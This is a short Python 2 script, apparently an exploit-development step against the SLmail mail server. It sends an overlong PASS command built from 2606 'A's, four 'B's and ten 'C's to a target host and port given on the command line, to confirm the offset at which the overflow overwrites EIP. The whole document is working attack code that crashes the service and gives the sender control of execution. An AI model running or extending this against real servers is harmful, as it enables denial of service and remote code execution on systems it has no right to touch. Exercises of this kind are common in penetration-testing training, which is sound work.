#!/usr/bin/python
import socket
import sys

junk = "A" * 2606
eip_override = "B" * 4
junk2 = "C" * 10

confirm_string = junk + eip_override + junk2

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\nSending the verification string to SLmail to confirm of the eip location."

soc.connect((server_ip, server_port))
d = soc.recv(1024)

soc.send('USER something' + '\r\n')
d = soc.recv(1024)

soc.send('PASS ' + confirm_string + '\r\n') # SLmail BO vulnerability is in the PASS command
d = soc.recv(1024)

soc.close()

print "Done sending."
